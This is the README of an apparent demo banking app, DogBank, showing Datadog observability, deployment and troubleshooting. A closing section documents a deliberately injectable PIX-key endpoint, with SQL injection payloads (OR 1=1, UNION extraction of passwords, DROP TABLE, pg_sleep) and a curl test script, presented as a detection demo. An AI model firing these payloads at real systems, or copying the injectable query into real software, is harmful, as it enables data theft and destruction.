# 🐕 DogBank - Sistema Bancário Digital com Observabilidade Completa

[![CI/CD](https://github.com/schawirin/Dogbank/actions/workflows/build-and-push.yml/badge.svg)](https://github.com/schawirin/Dogbank/actions)
[![Datadog Monitoring](https://img.shields.io/badge/Datadog-Monitored-632CA6?logo=datadog)](https://www.datadoghq.com/)
[![Kubernetes](https://img.shields.io/badge/Kubernetes-Ready-326CE5?logo=kubernetes)](https://kubernetes.io/)

Sistema bancário digital moderno com foco em **observabilidade**, **monitoramento distribuído** e **segurança**. Implementa transações PIX com validação em tempo real pelo Banco Central simulado, totalmente instrumentado com Datadog APM, RUM, Logs e Security.

---

## 📋 Índice

- [Visão Geral](#-visão-geral)
- [Arquitetura](#-arquitetura)
- [Módulos da Aplicação](#-módulos-da-aplicação)
- [Stack Tecnológico](#-stack-tecnológico)
- [Pré-requisitos](#-pré-requisitos)
- [Configuração do Ambiente](#-configuração-do-ambiente)
- [Como Executar](#-como-executar)
- [CI/CD Pipeline](#-cicd-pipeline)
- [Observabilidade com Datadog](#-observabilidade-com-datadog)
- [Acesso à Aplicação](#-acesso-à-aplicação)
- [Estrutura do Projeto](#-estrutura-do-projeto)
- [Features Implementadas](#-features-implementadas)
- [Troubleshooting](#-troubleshooting)

---

## 🎯 Visão Geral

O **DogBank** é uma aplicação de demonstração de um sistema bancário digital construído com arquitetura de microserviços, focado em:

- ✅ **Observabilidade completa** com Datadog (APM, RUM, Logs, Security)
- ✅ **Distributed Tracing** end-to-end
- ✅ **Correlação automática** entre logs, traces e métricas
- ✅ **Segurança integrada** com ASM (Application Security Monitoring)
- ✅ **CI/CD automatizado** com GitHub Actions
- ✅ **Deployment em Kubernetes** com EKS

### 🚀 Principais Funcionalidades

- **Autenticação e Autorização** (JWT)
- **Gestão de Contas Bancárias**
- **Transferências via PIX** com validação no Banco Central
- **Simulação de erros** (timeout, saldo insuficiente, limite excedido)
- **Dashboard em tempo real** (React)

---

## 🏗️ Arquitetura

```
┌──────────────────────────────────────────────────────────────┐
│                     Traefik Ingress                          │
│              (a3e5f8c-production-default.us-east-1.elb...)   │
└─────────────────────┬────────────────────────────────────────┘
                      │
          ┌───────────┴──────────┬─────────────────┐
          │                      │                 │
    ┌─────▼─────┐         ┌─────▼─────┐    ┌─────▼─────┐
    │  Frontend │         │   Auth    │    │  Accounts │
    │  (React)  │         │   :8088   │    │   :8089   │
    └───────────┘         └───────────┘    └───────────┘
          │                      │                 │
          └──────────┬───────────┴─────────────────┘
                     │
          ┌──────────┴────────────┬────────────────┐
          │                       │                │
    ┌─────▼─────┐          ┌─────▼─────┐   ┌─────▼─────┐
    │Transaction│          │Integration│   │   Banco   │
    │   :8084   │          │   :8082   │   │  Central  │
    └─────┬─────┘          └───────────┘   │   :8085   │
          │                                 └───────────┘
    ┌─────▼─────┐
    │PostgreSQL │
    │   :5432   │
    └───────────┘
```

**Todos os serviços são instrumentados com Datadog Agent via Admission Controller.**

---

## 📦 Módulos da Aplicação

### 1. **auth-module** (porta 8088)
- **Responsabilidade**: Autenticação e autorização de usuários
- **Tecnologia**: Spring Boot 2.7.0, Spring Security, JWT
- **Funcionalidades**:
  - Login/logout
  - Geração e validação de tokens JWT
  - Gestão de usuários

### 2. **account-module** (porta 8089)
- **Responsabilidade**: Gestão de contas bancárias
- **Tecnologia**: Spring Boot 2.7.0, Spring Data JPA
- **Funcionalidades**:
  - Criação de contas
  - Consulta de saldo
  - Histórico de transações

### 3. **transaction-module** (porta 8084)
- **Responsabilidade**: Processamento de transações PIX
- **Tecnologia**: Spring Boot 2.7.0, RestTemplate
- **Funcionalidades**:
  - Transferências via PIX
  - Validação com Banco Central
  - Logs estruturados com MDC (trace correlation)
  - Tratamento de erros (timeout, saldo insuficiente)

### 4. **bancocentral-module** (porta 8085)
- **Responsabilidade**: Simulador do Banco Central do Brasil
- **Tecnologia**: Spring Boot 2.7.0
- **Funcionalidades**:
  - Validação de chaves PIX
  - Simulação de cenários de erro:
    - `R$ 100,00` → Timeout (5 segundos)
    - `R$ 1.000,00` → Limite excedido
    - `R$ 5.000,00` → Saldo insuficiente
    - `R$ 666,66` → Erro interno
    - Chave sem `@` → Chave inválida

### 5. **integration-module** (porta 8082)
- **Responsabilidade**: Integrações externas e cache
- **Tecnologia**: Spring Boot 2.7.0, Spring Data JPA

### 6. **notification-module** (porta 8083)
- **Responsabilidade**: Notificações de transações
- **Tecnologia**: Spring Boot 2.7.0

### 7. **dogbank-frontend** (React)
- **Responsabilidade**: Interface do usuário
- **Tecnologia**: React 18, Vite, TailwindCSS
- **Features**:
  - Dashboard de contas
  - Interface de transferência PIX
  - Datadog RUM integrado

---

## 🛠️ Stack Tecnológico

### Backend
| Tecnologia | Versão |
|------------|--------|
| Java | 17 (Eclipse Temurin) |
| Spring Boot | 2.7.0 |
| Maven | 3.9.7 |
| PostgreSQL | 15 |
| Log4j2 | 2.17.1 |
| ECS Layout | 1.5.0 |

### Frontend
| Tecnologia | Versão |
|------------|--------|
| React | 18.x |
| Vite | 4.x |
| TailwindCSS | 3.x |
| Datadog Browser SDK | 5.x |

### Infraestrutura
| Tecnologia | Versão |
|------------|--------|
| Kubernetes | 1.27+ |
| Traefik | 2.x |
| Docker | 24.x |
| GitHub Actions | - |

### Observabilidade
| Ferramenta | Uso |
|------------|-----|
| Datadog Agent | 7.x |
| Datadog APM | Distributed Tracing |
| Datadog Logs | Correlação de logs |
| Datadog RUM | Real User Monitoring |
| Datadog ASM | Application Security |

---

## ✅ Pré-requisitos

Antes de começar, certifique-se de ter:

- ✅ **Kubernetes Cluster** (EKS, GKE, AKS ou local com Minikube)
- ✅ **kubectl** instalado e configurado
- ✅ **Docker** (para build local)
- ✅ **Conta Datadog** com API Key
- ✅ **Datadog Operator** instalado no cluster
- ✅ **GitHub Account** (para CI/CD)
- ✅ **Docker Hub Account** (ou outro registry)

---

## ⚙️ Configuração do Ambiente

### 1. **Criar Secret do PostgreSQL**

⚠️ **IMPORTANTE**: Antes de fazer o deploy, crie o secret do banco de dados:

```bash
# Encode as credenciais em base64
echo -n "dogbank" | base64    # Usuário
echo -n "dog1234" | base64    # Senha
echo -n "dogbank" | base64    # Database

# O dogbank-complete.yaml já contém o secret, mas você pode customizar:
# POSTGRES_USER: ZG9nYmFuaw==      (dogbank)
# POSTGRES_PASSWORD: ZG9nMTIzNA==  (dog1234)
# POSTGRES_DB: ZG9nYmFuaw==        (dogbank)
```

### 2. **Configurar Datadog RUM no Frontend**

📝 **Edite o arquivo**: `dogbank-frontend/src/main.jsx`

```javascript
datadogRum.init({
  applicationId: 'SEU_APPLICATION_ID',  // ⚠️ ALTERE AQUI
  clientToken: 'SEU_CLIENT_TOKEN',       // ⚠️ ALTERE AQUI
  site: 'datadoghq.com',
  service: 'dogbank-frontend',
  env: 'production',
  version: '1.0.0',
  sessionSampleRate: 100,
  sessionReplaySampleRate: 100,
  trackUserInteractions: true,
  trackResources: true,
  trackLongTasks: true,
  defaultPrivacyLevel: 'mask-user-input',
});
```

**Como obter as credenciais**:
1. Acesse: https://app.datadoghq.com/rum/application/create
2. Crie uma nova aplicação RUM
3. Copie o `Application ID` e `Client Token`

### 3. **Configurar Secrets do GitHub (para CI/CD)**

No seu repositório GitHub, vá em **Settings → Secrets and variables → Actions** e adicione:

| Secret Name | Descrição | Exemplo |
|-------------|-----------|---------|
| `DOCKERHUB_USERNAME` | Usuário do Docker Hub | `schawirin` |
| `DOCKERHUB_TOKEN` | Token de acesso do Docker Hub | `dckr_pat_...` |

### 4. **Configurar Datadog Operator no Cluster**

```bash
# Instalar o Datadog Operator
helm repo add datadog https://helm.datadoghq.com
helm repo update

kubectl create namespace datadog

helm install datadog-operator datadog/datadog-operator \
  --namespace datadog

# Criar DatadogAgent com auto-instrumentation
cat <<EOF | kubectl apply -f -
apiVersion: datadoghq.com/v2alpha1
kind: DatadogAgent
metadata:
  name: datadog
  namespace: datadog
spec:
  global:
    site: datadoghq.com
    credentials:
      apiKey: <SUA_API_KEY>
      appKey: <SUA_APP_KEY>
  features:
    apm:
      enabled: true
      unixDomainSocketConfig:
        enabled: true
    logCollection:
      enabled: true
      containerCollectAll: true
    admissionController:
      enabled: true
      mutateUnlabelled: false
EOF
```

---

## 🚀 Como Executar

### Opção 1: Deploy Completo no Kubernetes

```bash
# 1. Clone o repositório
git clone https://github.com/schawirin/Dogbank.git
cd Dogbank

# 2. Deploy completo (namespace, secrets, deployments, services)
kubectl apply -f dogbank-complete.yaml

# 3. Aguarde os pods ficarem prontos
kubectl get pods -n production -w

# 4. Verifique os services
kubectl get svc -n production
```

### Opção 2: Build e Deploy Local

```bash
# Build de todos os módulos
cd dogbank

# Transaction
docker buildx build --platform linux/amd64 \
  -f transaction-module/Dockerfile \
  -t seu-usuario/dogbank-transaction-service:latest \
  --push .

# Auth
docker buildx build --platform linux/amd64 \
  -f auth-module/Dockerfile \
  -t seu-usuario/dogbank-auth-service:latest \
  --push .

# Repita para todos os módulos...

# Deploy
kubectl apply -f dogbank-complete.yaml
```

### Opção 3: Desenvolvimento Local

```bash
# Backend (cada módulo)
cd dogbank/transaction-module
mvn spring-boot:run

# Frontend
cd dogbank-frontend
npm install
npm run dev
```

---

## 🔄 CI/CD Pipeline

O projeto utiliza **GitHub Actions** para CI/CD automatizado:

### Workflow: `build-and-push.yml`

**Triggers**:
- ✅ Push na branch `main`
- ✅ Pull Requests

**Jobs**:
1. **Build & Push** de cada módulo (auth, account, transaction, etc.)
2. **Build Docker images** multi-architecture (linux/amd64)
3. **Push para Docker Hub** automaticamente

### Integração com Datadog CI Visibility

📊 **Recomendação**: Integre o GitHub Actions com Datadog CI Visibility:

```yaml
# Adicione ao seu workflow (.github/workflows/build-and-push.yml)
- name: Datadog CI Test Visibility
  env:
    DD_ENV: ci
    DD_SERVICE: dogbank
    DATADOG_API_KEY: ${{ secrets.DATADOG_API_KEY }}
  run: |
    # Seus comandos de build/test
```

**Como configurar**:
1. Acesse: https://app.datadoghq.com/ci/setup
2. Selecione "GitHub Actions"
3. Siga as instruções para adicionar o `DD_API_KEY`

---

## 📊 Observabilidade com Datadog

### APM (Application Performance Monitoring)

✅ **Configurado automaticamente** via Datadog Admission Controller

**Features ativas**:
- Distributed Tracing end-to-end
- Profiling contínuo
- Service Map automático
- Error Tracking

**Acessar**: https://app.datadoghq.com/apm/services

### Logs

✅ **Formato**: JSON (ECS Layout)  
✅ **Correlação**: Automática com `dd.trace_id` e `dd.span_id`

**Campos customizados no TransactionService**:
- `chave_pix`
- `valor`
- `status_transacao`
- `remetente_nome`
- `remetente_banco`
- `destinatario_nome`
- `destinatario_banco`
- `transaction_id`
- `duracao_ms`

**Acessar**: https://app.datadoghq.com/logs

### RUM (Real User Monitoring)

✅ **Frontend**: React com Datadog Browser SDK  
✅ **Features**:
- Session Replay
- User interactions tracking
- Resource tracking
- Error tracking

**Acessar**: https://app.datadoghq.com/rum

### Security (ASM)

✅ **Application Security Monitoring** ativo em todos os serviços  
✅ **Features**:
- Detecção de ataques (SQL Injection, XSS, etc.)
- IAST (Interactive Application Security Testing)
- SCA (Software Composition Analysis)

**Acessar**: https://app.datadoghq.com/security/appsec

---

## 🌐 Acesso à Aplicação

### Via Traefik Ingress

Por padrão, a aplicação é exposta via **Traefik LoadBalancer**:

```bash
# Obter o DNS do LoadBalancer
kubectl get svc -n production traefik

# Exemplo de saída:
# NAME      TYPE           EXTERNAL-IP
# traefik   LoadBalancer   a3e5f8c-production-default.us-east-1.elb.amazonaws.com
```

**Acessar o frontend**:
```
http://<EXTERNAL-IP>
```

**Acessar os serviços**:
- Auth: `http://<EXTERNAL-IP>/auth`
- Accounts: `http://<EXTERNAL-IP>/accounts`
- Transactions: `http://<EXTERNAL-IP>/transactions`

### 🚀 Publicar com Domínio Próprio (Recomendado)

#### Opção 1: AWS Route53

```bash
# 1. Criar Hosted Zone no Route53
aws route53 create-hosted-zone --name dogbank.io

# 2. Criar registro A apontando para o LoadBalancer
aws route53 change-resource-record-sets \
  --hosted-zone-id Z123456789 \
  --change-batch '{
    "Changes": [{
      "Action": "CREATE",
      "ResourceRecordSet": {
        "Name": "dogbank.io",
        "Type": "A",
        "AliasTarget": {
          "HostedZoneId": "Z35SXDOTRQ7X7K",
          "DNSName": "a3e5f8c-production-default.us-east-1.elb.amazonaws.com",
          "EvaluateTargetHealth": false
        }
      }
    }]
  }'

# 3. Atualizar Traefik IngressRoute
kubectl apply -f - <<EOF
apiVersion: traefik.containo.us/v1alpha1
kind: IngressRoute
metadata:
  name: dogbank-frontend
  namespace: production
spec:
  entryPoints:
    - websecure
  routes:
    - match: Host(\`dogbank.io\`)
      kind: Rule
      services:
        - name: dogbank-frontend
          port: 80
  tls:
    certResolver: letsencrypt
EOF
```

#### Opção 2: Cloudflare

```bash
# 1. Adicionar domínio no Cloudflare
# 2. Criar registro CNAME
# Nome: @
# Conteúdo: <EXTERNAL-IP-DO-TRAEFIK>
# Proxy: Ativado (nuvem laranja)

# 3. Configurar SSL/TLS: Full (strict)
```

#### Opção 3: GCP Cloud DNS

```bash
# Criar zona DNS
gcloud dns managed-zones create dogbank-zone \
  --dns-name="dogbank.io." \
  --description="DogBank DNS Zone"

# Adicionar registro A
gcloud dns record-sets transaction start --zone=dogbank-zone
gcloud dns record-sets transaction add <EXTERNAL-IP> \
  --name="dogbank.io." --ttl=300 --type=A --zone=dogbank-zone
gcloud dns record-sets transaction execute --zone=dogbank-zone
```

---

## 📂 Estrutura do Projeto

```
Dogbank/
├── .github/
│   └── workflows/
│       └── build-and-push.yml          # CI/CD pipeline
├── dogbank/
│   ├── pom.xml                         # Parent POM
│   ├── auth-module/
│   │   ├── src/
│   │   ├── Dockerfile
│   │   └── pom.xml
│   ├── account-module/
│   │   ├── src/
│   │   ├── Dockerfile
│   │   └── pom.xml
│   ├── transaction-module/
│   │   ├── src/
│   │   ├── Dockerfile
│   │   └── pom.xml
│   ├── bancocentral-module/
│   │   ├── src/
│   │   ├── Dockerfile
│   │   └── pom.xml
│   ├── integration-module/
│   │   ├── src/
│   │   ├── Dockerfile
│   │   └── pom.xml
│   └── notification-module/
│       ├── src/
│       ├── Dockerfile
│       └── pom.xml
├── dogbank-frontend/
│   ├── src/
│   │   ├── main.jsx                   # Datadog RUM config
│   │   └── ...
│   ├── Dockerfile
│   └── package.json
├── dogbank-complete.yaml              # Kubernetes manifests
└── README.md
```

---

## ✨ Features Implementadas

### Backend
- ✅ Arquitetura de microserviços
- ✅ Autenticação JWT
- ✅ Validação de transações PIX
- ✅ Simulação de cenários de erro
- ✅ Logs estruturados em JSON (ECS)
- ✅ Correlação automática de traces e logs
- ✅ Health checks (Spring Actuator)
- ✅ Security (Spring Security)

### Frontend
- ✅ Dashboard responsivo
- ✅ Interface de transferência PIX
- ✅ Datadog RUM integrado
- ✅ Session Replay
- ✅ Error tracking

### DevOps
- ✅ CI/CD automatizado (GitHub Actions)
- ✅ Multi-stage Docker builds
- ✅ Kubernetes manifests
- ✅ Secrets management
- ✅ Resource limits e requests
- ✅ Liveness e Readiness probes
- ✅ Rolling updates

### Observabilidade
- ✅ APM end-to-end
- ✅ Distributed Tracing
- ✅ Log correlation
- ✅ RUM (Real User Monitoring)
- ✅ Profiling
- ✅ Security Monitoring (ASM)
- ✅ CI Visibility (recomendado)

---

## 🐛 Troubleshooting

### Pods não iniciam

```bash
# Ver logs do pod
kubectl logs -n production <pod-name>

# Descrever o pod
kubectl describe pod -n production <pod-name>

# Verificar events
kubectl get events -n production --sort-by='.lastTimestamp'
```

### Health checks falhando

```bash
# Testar endpoint manualmente
kubectl port-forward -n production svc/accounts-service 8089:8089
curl http://localhost:8089/actuator/health
```

### Logs não aparecem no Datadog

```bash
# Verificar se o Datadog Agent está rodando
kubectl get pods -n datadog

# Verificar logs do Agent
kubectl logs -n datadog <datadog-agent-pod>

# Verificar se os pods têm as labels corretas
kubectl get pods -n production --show-labels
```

### Traces não correlacionam com logs

```bash
# Verificar se DD_LOGS_INJECTION está setado
kubectl get deployment -n production transactions -o yaml | grep DD_LOGS_INJECTION

# Verificar formato dos logs (deve ser JSON)
kubectl logs -n production <pod-name> | head -1 | jq .




```

EXTRA !! Testar ataque de sql Injection !!


Como funciona o ataque:
1. Query SQL Normal:
sqlSELECT u.nome, u.email, u.cpf, c.saldo, c.banco, u.chave_pix 
FROM usuarios u 
JOIN contas c ON u.id = c.usuario_id 
WHERE u.chave_pix = 'yuki.pix@email.com'
2. Query SQL com Injection:
sqlSELECT u.nome, u.email, u.cpf, c.saldo, c.banco, u.chave_pix 
FROM usuarios u 
JOIN contas c ON u.id = c.usuario_id 
WHERE u.chave_pix = 'yuki.pix@email.com' OR '1'='1'
Resultado: Retorna TODOS os usuários porque '1'='1' é sempre verdadeiro!
🎯 Outros Payloads para testar:
Payload 1: Bypass simples
' OR '1'='1
→ Retorna o primeiro usuário da tabela
Payload 2: Union-based (extrair dados)
' UNION SELECT nome, senha, cpf, email, banco, chave_pix FROM usuarios--
→ Tenta extrair senhas dos usuários
Payload 3: Comentar resto da query
test@email.com'--
→ Ignora o resto da query SQL
Payload 4: Stacked queries
'; DROP TABLE transacoes_pix;--
⚠️ NÃO TESTE ISSO - Vai deletar a tabela!
Payload 5: Time-based blind
' OR pg_sleep(5)--
→ Causa delay de 5 segundos se vulnerável
Payload 6: Error-based
' AND 1=CAST((SELECT COUNT(*) FROM usuarios) AS INT)--
→ Força erro para revelar quantidade de usuários
🔍 Onde ver o ataque no Datadog:
1. Logs
Filtre por:
@security_event:sql_injection_vulnerable_endpoint
Você verá:
json{
  "security_event": "sql_injection_vulnerable_endpoint",
  "input_pix_key": "yuki.pix@email.com' OR '1'='1",
  "endpoint": "/api/transactions/validate-pix-key"
}
2. APM Traces
Filtre por:
@appsec.event:true
3. Application Security → Threats
Vá para: https://app.datadoghq.com/security/appsec/threats
Você verá:

🚨 SQL Injection Attack Detected
Severity: HIGH
Attack Type: SQL Injection
Payload: yuki.pix@email.com' OR '1'='1
Service: transactions
IP Address: Seu IP

4. Security Signals
https://app.datadoghq.com/security
Datadog criará um Security Signal automaticamente:

Rule: SQL Injection detected
Status: Triggered
Affected Service: transactions

🎬 Script de Teste Completo
bash#!/bin/bash

BASE_URL="http://your-loadbalancer-url"

echo "🔒 Testando SQL Injection no DogBank"
echo ""

# Teste 1: Normal
echo "1️⃣ Query NORMAL:"
curl -s "${BASE_URL}/api/transactions/validate-pix-key?pixKey=yuki.pix@email.com" | jq .
echo ""

# Teste 2: SQL Injection básico
echo "2️⃣ SQL INJECTION - OR 1=1:"
curl -s "${BASE_URL}/api/transactions/validate-pix-key?pixKey=' OR '1'='1" | jq .
echo ""

# Teste 3: Union-based
echo "3️⃣ UNION-BASED SQL INJECTION:"
curl -s "${BASE_URL}/api/transactions/validate-pix-key?pixKey=' UNION SELECT nome, senha, cpf, email, banco, chave_pix FROM usuarios--" | jq .
echo ""

# Teste 4: Comment-based
echo "4️⃣ COMMENT-BASED:"
curl -s "${BASE_URL}/api/transactions/validate-pix-key?pixKey=test'--" | jq .
echo ""

echo "✅ Verifique os ataques em: https://app.datadoghq.com/security/appsec/threats"
📊 Resultado Esperado no Datadog ASM:
┌─────────────────────────────────────────────────────────┐
│ 🚨 SQL Injection Attack Detected                        │
├─────────────────────────────────────────────────────────┤
│ Time: 2025-10-10 17:30:45                               │
│ Service: transactions                                    │
│ Endpoint: /api/transactions/validate-pix-key            │
│ Attack Type: SQL Injection                               │
│ Severity: HIGH                                           │
│ Payload: yuki.pix@email.com' OR '1'='1                  │
│ Source IP: 177.45.xxx.xxx                                │
│ User Agent: Mozilla/5.0...                               │
├─────────────────────────────────────────────────────────┤
│ 📊 Impact:                                               │
│ • Unauthorized data access                               │
│ • Potential data breach                                  │
│ • Database structure exposure                            │
└─────────────────────────────────────────────────────────┘
Agora você tem uma demo COMPLETA de SQL Injection com detecção do Datadog ASM! 🎯🔒


---

## 📝 Licença

Este projeto é uma aplicação de demonstração para fins educacionais e de observabilidade.

---

## 👥 Contato

- **GitHub**: [@schawirin](https://github.com/schawirin)
- **Projeto**: [DogBank](https://github.com/schawirin/Dogbank)

---

## 🙏 Agradecimentos

- [Datadog](https://www.datadoghq.com/) pela plataforma de observabilidade
- [Spring Boot](https://spring.io/projects/spring-boot) pelo framework
- [Traefik](https://traefik.io/) pelo ingress controller

---

**🐕 Made with ❤️ by DogBank Team**